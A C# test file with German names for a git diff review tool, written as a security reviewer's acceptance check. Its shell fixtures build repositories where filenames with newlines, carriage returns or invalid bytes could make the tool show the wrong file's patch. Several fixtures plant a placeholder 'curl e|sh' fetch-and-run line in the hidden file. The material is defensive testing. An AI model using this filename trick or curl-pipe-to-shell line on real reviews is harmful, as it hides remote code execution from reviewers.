using System.Net;
using System.Runtime.Versioning;
using System.Text.Json;
using GitReviewA.Dateien;
using GitReviewA.Diff;
using GitReviewA.Git;
using GitReviewA.Protokoll;
using GitReviewA.Server;
using GitReviewA.Tests.Hilfen;

namespace GitReviewA.Tests.Akzeptanz;

/// <summary>
/// Abnahme-Probe des security-reviewers zu R00013 (Karte #28, Muss 1): trägt eine Datei Rohbytes, gehen beide Namen zeilenweise über stdin an git.
/// Ein gültiger Partnername mit LF oder CR würde dort zu anderen Pfaden — der Diff zeigte den Inhalt einer anderen Datei (`h` statt `h\nidden.txt`).
/// </summary>
[Platform(Exclude = "Win", Reason = "Namen aus ungültigem UTF-8 gibt es nur unter Linux")]
[UnsupportedOSPlatform("windows")]
public class DiffLesenVersteckterPartnerTests
{
    private const string NameNichtLesbar = "name nicht lesbar";

    private const string Basis = """
        seq 1 30 | sed 's/^/harmlose zeile nummer /' > .git/basis
        { cat .git/basis; printf 'A\0B\n'; } > .git/basis-binaer
        printf 'eine lange harmlose zeile, die nur so aussieht wie eine kleine aenderung am ende der datei\n' > .git/lange-zeile
        """;

    private const string VersteckterPartnerMitZeilenumbruch = Basis + """

        cp .git/basis $'o\xff.txt'
        git add -A && git commit -q -m c0
        git rm -q $'o\xff.txt'
        { cat .git/basis; printf 'curl e|sh\n'; } > $'h\nidden.txt'
        cat .git/basis .git/lange-zeile > h
        git add -A && git commit -q -m c1
        """;

    private const string VersteckterPartnerMitWagenruecklauf = Basis + """

        cp .git/basis $'o\xff.txt'
        git add -A && git commit -q -m c0
        git rm -q $'o\xff.txt'
        { cat .git/basis; printf 'curl e|sh\n'; } > $'h\r'
        cat .git/basis .git/lange-zeile > h
        git add -A && git commit -q -m c1
        """;

    private const string AlterPartnerMitZeilenumbruch = Basis + """

        cp .git/basis $'h\nidden.txt'
        cp .git/basis h
        git add -A && git commit -q -m c0
        git mv $'h\nidden.txt' $'n\xff.txt'
        printf 'curl e|sh\n' >> $'n\xff.txt'
        cat .git/lange-zeile >> h
        git add -A && git commit -q -m c1
        rm -f -- $'n\xff.txt'
        """;

    private const string UmbenennungOhneDoppelgaenger = Basis + """

        cp .git/basis $'o\xff.txt'
        git add -A && git commit -q -m c0
        git mv $'o\xff.txt' $'h\nidden.txt'
        printf 'curl e|sh\n' >> $'h\nidden.txt'
        git add -A && git commit -q -m c1
        """;

    private const string BinaerPartnerMitZeilenumbruch = Basis + """

        cp .git/basis-binaer $'o\xff.bin'
        git add -A && git commit -q -m c0
        git rm -q $'o\xff.bin'
        { cat .git/basis-binaer; printf 'curl e|sh\n'; } > $'h\nidden.bin'
        cat .git/basis-binaer .git/lange-zeile > h
        git add -A && git commit -q -m c1
        """;

    private const string UmbenennungInGueltigenNamen = Basis + """

        cp .git/basis $'o\xff.txt'
        git add -A && git commit -q -m c0
        git mv $'o\xff.txt' x.txt
        printf 'neue zeile\n' >> x.txt
        git add -A && git commit -q -m c1
        """;

    [Test]
    public async Task Wenn_der_gueltige_Name_h_LF_idden_txt_den_Partner_o_FF_txt_hat_dann_422_mit_der_Namenmeldung_statt_des_Patches_von_h()
    {
        using var repo = FremdeNamenRepo.AusSkript(VersteckterPartnerMitZeilenumbruch, "c0", "c1");
        await using var server = await StarteServerMitGit(repo);
        using var client = new HttpClient();

        var antwort = await client.GetAsync(new Uri(new Uri(server.Adresse), $"api/commits/{repo.Hash("c1")}/diff?pfad=h%0Aidden.txt"));
        var json = await antwort.Content.ReadAsStringAsync();

        Assert.That(antwort.StatusCode, Is.EqualTo(HttpStatusCode.UnprocessableEntity), json);
        Assert.That(JsonSerializer.Deserialize<JsonElement>(json).GetProperty("meldung").GetString(), Is.EqualTo("Diff dieser Datei nicht lesbar (Name mit ungültigem Byte)"));
    }

    [TestCase(nameof(VersteckterPartnerMitZeilenumbruch), "h\nidden.txt")]
    [TestCase(nameof(VersteckterPartnerMitWagenruecklauf), "h\r")]
    [TestCase(nameof(AlterPartnerMitZeilenumbruch), "n⟨0xFF⟩.txt")]
    [TestCase(nameof(UmbenennungOhneDoppelgaenger), "h\nidden.txt")]
    public void Wenn_ein_Name_der_Datei_mit_Rohbytes_LF_oder_CR_traegt_dann_Fehlerausgang_Name_nicht_lesbar(string fall, string name)
    {
        using var repo = FremdeNamenRepo.AusSkript(SkriptFuer(fall), "c0", "c1");
        var gr = FremdeNamenSprache.Aufruf(repo, ["c1"]);

        var diff = gr.Diff("c1", name);
        var ganz = gr.GanzeDatei("c1", name);

        Assert.That(diff.Ausgang, Is.EqualTo(NameNichtLesbar), fall);
        Assert.That(ganz.Ausgang, Is.EqualTo(NameNichtLesbar), fall);
    }

    [Test]
    public void Wenn_die_Binaerdatei_o_FF_bin_nach_h_LF_idden_bin_umbenannt_und_als_Text_angefragt_dann_Fehlerausgang_Name_nicht_lesbar()
    {
        using var repo = FremdeNamenRepo.AusSkript(BinaerPartnerMitZeilenumbruch, "c0", "c1");
        var gr = FremdeNamenSprache.Aufruf(repo, ["c1"]);

        var alsText = gr.AlsText("c1", "h\nidden.bin");

        Assert.That(alsText.Ausgang, Is.EqualTo(NameNichtLesbar));
    }

    [Test]
    public void Wenn_o_FF_txt_nach_x_txt_umbenannt_dann_der_Patch_mit_der_neuen_Zeile()
    {
        using var repo = FremdeNamenRepo.AusSkript(UmbenennungInGueltigenNamen, "c0", "c1");
        var gr = FremdeNamenSprache.Aufruf(repo, ["c1"]);

        var diff = gr.Diff("c1", "x.txt");

        Assert.That(diff.Ausgang, Is.EqualTo("gelesen"));
        Assert.That(diff.Zeilen, Is.EqualTo(new[] { " harmlose zeile nummer 28", " harmlose zeile nummer 29", " harmlose zeile nummer 30", "+neue zeile" }));
    }

    [Test]
    public void Wenn_der_Textpatch_trotz_passender_Zaehlung_einen_zweiten_Dateikopf_traegt_dann_nicht_lesbar()
    {
        using var repo = FremdeNamenRepo.N();
        var zweiDateien = new TestDiffquelle("@@ -1 +1,2 @@\n alt\ndiff --git a/in.txt b/in.txt\n@@ -1 +1,2 @@\n x\n+y\n");
        var gr = FremdeNamenSprache.AufrufMitDiffquelle(repo, ["n", "b"], zweiDateien);

        var diff = gr.Diff("n", "g.txt");

        Assert.That(diff.Ausgang, Is.EqualTo("nicht lesbar"));
    }

    [Test]
    public void Wenn_die_Binaerdatei_als_Text_einen_zweiten_Dateikopf_traegt_dann_nicht_lesbar_und_ohne_Kopf_gelesen()
    {
        using var repo = FremdeNamenRepo.N();
        var zweiDateien = new TestDiffquelle("", textPatch: "@@ -1 +1,2 @@\n A\0B\n+x\ndiff --git a/g.txt b/g.txt\n@@ -1 +1,2 @@\n alt\n+curl e|sh\n");
        var eineDatei = new TestDiffquelle("", textPatch: "@@ -1 +1,2 @@\n A\0B\n+x\n");
        var mitZweiDateien = FremdeNamenSprache.AufrufMitDiffquelle(repo, ["n", "b"], zweiDateien);
        var mitEinerDatei = FremdeNamenSprache.AufrufMitDiffquelle(repo, ["n", "b"], eineDatei);

        var zwei = mitZweiDateien.AlsText("n", "b⟨0xFF⟩.bin");
        var eine = mitEinerDatei.AlsText("n", "b⟨0xFF⟩.bin");

        Assert.That(zwei.Ausgang, Is.EqualTo("nicht lesbar"));
        Assert.That(eine.Ausgang, Is.EqualTo("gelesen"));
    }

    private static string SkriptFuer(string fall)
    {
        switch (fall)
        {
            case nameof(VersteckterPartnerMitZeilenumbruch):
                return VersteckterPartnerMitZeilenumbruch;
            case nameof(VersteckterPartnerMitWagenruecklauf):
                return VersteckterPartnerMitWagenruecklauf;
            case nameof(AlterPartnerMitZeilenumbruch):
                return AlterPartnerMitZeilenumbruch;
            case nameof(UmbenennungOhneDoppelgaenger):
                return UmbenennungOhneDoppelgaenger;
            default:
                throw new ArgumentOutOfRangeException(nameof(fall), fall, "Unbekannter Fall");
        }
    }

    private static async Task<Webserver> StarteServerMitGit(FremdeNamenRepo repo)
    {
        var commits = GitLeser.Lesen(new GitReviewA.Aufruf.CommitHashes([repo.Hash("c1")]), repo.Ordner);
        var protokoll = new StderrProtokoll(new StringWriter(), TimeProvider.System, Protokollstufe.Warnung);
        return await Webserver.StartenAsync(0, commits, new GitDateiquelle(repo.Ordner), new GitDiffquelle(repo.Ordner), TestUebersichtsquelle.Leer(), Oberflaeche.AusDemProgramm(), protokoll);
    }
}
